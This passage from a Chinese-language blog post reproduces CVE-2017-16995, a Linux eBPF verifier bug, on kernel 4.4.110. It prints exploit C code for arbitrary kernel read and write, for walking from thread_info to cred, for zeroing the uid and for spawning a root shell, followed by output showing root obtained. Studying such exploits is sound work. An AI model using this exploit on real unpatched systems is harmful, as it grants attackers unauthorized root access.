0x0, 0x0)              //exit(0)</span><br><span class="line">[39]: STX_MEM_DW(BPF_REG_7, BPF_REG_8, 0x0, 0x0)            //[r7] = r8</span><br><span class="line">[40]: JMP_EXIT(BPF_REG_0, BPF_REG_0, 0x0, 0x0)              //exit(0)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>再看一下实际执行的情况，内核版本是4.4.110，直接使用了p4nda大佬编译的<a href="https://github.com/ret2p4nda/kernel-pwn/tree/master/cve-2017-16995" target="_blank" rel="noopener">bzImage</a>，文件系统随便用的某一个kernel pwn题的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ uname -a</span><br><span class="line">Linux (none) 4.4.110 #1 SMP Thu Oct 11 05:33:12 PDT 2018 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></p>
<p>exp分为两部分，一部分为准备工作，创建map，加载eBPF代码以及绑定socket，和前面的sample介绍的流程类似，这里就不再赘述，只贴一下exp的函数调用流程:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//prepare</span></span><br><span class="line">mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);  </span><br><span class="line"><span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"mapfd create error"</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+]mapfd finished"</span>);</span><br><span class="line"></span><br><span class="line">progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,(struct bpf_insn *)__prog, PROGSIZE, <span class="string">"GPL"</span>, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+]bpf_prog_load finished"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))  </span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+]socketpair finished"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+]setsockopt finished"</span>);</span><br></pre></td></tr></table></figure></p>
<p>在进行exploit之前，首先介绍在exp中如何进行地址泄露以及任意地址读写，与eBPF指令[30]~[40]对应。首先是任意地址泄露，条件是map[0] = 0，将目标地址写入map[1]，读取map[2]进行泄露：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//map[0] = 0,map[1] = addr,map[2] = 0</span></span><br><span class="line"><span class="comment">//read target_addr from map[2]</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr) &#123;</span><br><span class="line">   __update_elem(<span class="number">0</span>, addr, <span class="number">0</span>); <span class="comment">//bpf_update_elem 0~2</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> get_value(<span class="number">2</span>); <span class="comment">//bpf_lookup_elem 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后是任意地址写，条件是map[0] != 0，然后将map[2]的值写入map[1]所在的地址中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//map[0] != 0,write map[2] to map[1]</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val) &#123;</span><br><span class="line"></span><br><span class="line">   __update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>还可以泄露rbp栈指针，条件是map[0] == 1，读取map[2]的值，就是rbp。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//map[0] = 1,get rbp from map[2]</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">   __update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将rbp泄露后，由于Linux将内核态的进程堆栈和线程描述符thread_info这两个部分紧凑的存放在一个单独的区域，这块区域通常为两个页框，thread_info存放在这个内存区的开始，由rbp &amp; ~(0x4000 - 1)获取thread_info的首地址，读取前8个字节即task_struct的地址。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/x86/include/asm/thread_info.h#L55</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">task</span>;</span>		<span class="comment">/* main task structure */</span></span><br><span class="line">	__u32			flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	__u32			status;		<span class="comment">/* thread synchronous flags */</span></span><br><span class="line">	__u32			cpu;		<span class="comment">/* current CPU */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sig_on_uaccess_error:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		uaccess_err:<span class="number">1</span>;	<span class="comment">/* uaccess failed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>通过这张图可以清晰的看出内核栈与thread_info，task_struct的关系，图来自于《深入理解Linux内核》<br><img src="/2020/03/07/CVE-2017-16995复现/3.png" alt="3"><br>然后通过cred的偏移获取cred结构体地址，根据uid偏移获取uid的地址，最后将其修改为0进行提权，然后get shell:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">sp = get_sp(fp);</span><br><span class="line"><span class="keyword">if</span>(sp &lt; PHYS_OFFSET)&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"bogus sp"</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task_struct = __read(sp);</span><br><span class="line"><span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"bogus task ptr"</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]task_struct = %lx\n"</span>, task_struct);</span><br><span class="line"></span><br><span class="line">credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"><span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"bogus cred ptr"</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]credptr = %lx\n"</span>, credptr);</span><br><span class="line"></span><br><span class="line">uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line"><span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"bogus uid ptr"</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"uidptr = %lx\n"</span>, uidptr);</span><br><span class="line"></span><br><span class="line">__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"spawning root shell\n"</span>);</span><br><span class="line">   system(<span class="string">"id"</span>);</span><br><span class="line">   system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[-]exploit failed"</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后exp执行效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">/ $ ./exp</span><br><span class="line">[+]mapfd finished</span><br><span class="line">[+]bpf_prog_load finished</span><br><span class="line">[+]socketpair finished</span><br><span class="line">[+]setsockopt finished</span><br><span class="line">[+]task_struct = 0xffff88000dbc5300</span><br><span class="line">[+]credptr = 0xffff88000d58d780</span><br><span class="line">uidptr = 0xffff88000d58d784</span><br><span class="line">spawning root shell</span><br><span class="line">uid=0(root) gid=0 euid=1000(pwn) egid=1000 groups=1000</span><br></pre></td></tr></table></figure></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[exp] <a href="http://cyseclabs.com/exploits/upstream44.c" target="_blank" rel="noopener">http://cyseclabs.com/exploits/upstream44.c</a><br>[exp] <a href="http://p4nda.top/2019/01/18/CVE-2017-16995/" target="_blank" rel="noopener">http://p4nda.top/2019/01/18/CVE-2017-16995/</a><br>[eBPF] <a href="https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-lo-eBPF-history/index.html</a><br><a href="https://xz.aliyun.com/t/2212" target="_blank" rel="noopener">https://xz.aliyun.com/t/2212</a><br><a href="http://p4nda.top/2019/01/18/CVE-2017-16995/" target="_blank" rel="noopener">http://p4nda.top/2019/01/18/CVE-2017-16995/</a><br><a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CVE/" rel="tag"># CVE</a>
          
            <a href="/tags/Linux-Vulnerability/" rel="tag"># Linux Vulnerability</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/02/14/ptmalloc源码分析3/" rel="next" title="ptmalloc源码学习（三）">
                <i class="fa fa-chevron-left"></i> ptmalloc源码学习（三）
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">51</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#eBPF模块"><span class="nav-number">1.</span> <span class="nav-text">eBPF模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#eBPF-sample"><span class="nav-number">1.1.</span> <span class="nav-text">eBPF sample</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#eBPF指令集"><span class="nav-number">2.</span> <span class="nav-text">eBPF指令集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#eBPF-verifier机制"><span class="nav-number">3.</span> <span class="nav-text">eBPF verifier机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#replace-map-fd-with-map-ptr"><span class="nav-number">3.1.</span> <span class="nav-text">replace_map_fd_with_map_ptr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#do-check"><span class="nav-number">3.2.</span> <span class="nav-text">do_check</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寄存器初始化"><span class="nav-number">3.2.1.</span> <span class="nav-text">寄存器初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检查中的常用函数"><span class="nav-number">3.2.2.</span> <span class="nav-text">检查中的常用函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#check-reg-arg"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">check_reg_arg</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#check-mem-access"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">check_mem_access</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BPF-ALU中的BPF-MOV"><span class="nav-number">3.2.3.</span> <span class="nav-text">BPF_ALU中的BPF_MOV</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BPF-JMP"><span class="nav-number">3.2.4.</span> <span class="nav-text">BPF_JMP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BPF-EXIT"><span class="nav-number">3.2.5.</span> <span class="nav-text">BPF_EXIT</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bpf-prog-run真正执行"><span class="nav-number">4.</span> <span class="nav-text">__bpf_prog_run真正执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用过程"><span class="nav-number">5.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#指令解码"><span class="nav-number">5.1.</span> <span class="nav-text">指令解码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指令执行过程"><span class="nav-number">5.2.</span> <span class="nav-text">指令执行过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过check"><span class="nav-number">5.2.1.</span> <span class="nav-text">绕过check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取map地址"><span class="nav-number">5.2.2.</span> <span class="nav-text">获取map地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取map-0-map-2"><span class="nav-number">5.2.3.</span> <span class="nav-text">获取map[0] ~ map[2]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意地址读写"><span class="nav-number">5.2.4.</span> <span class="nav-text">任意地址读写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击过程"><span class="nav-number">5.3.</span> <span class="nav-text">攻击过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
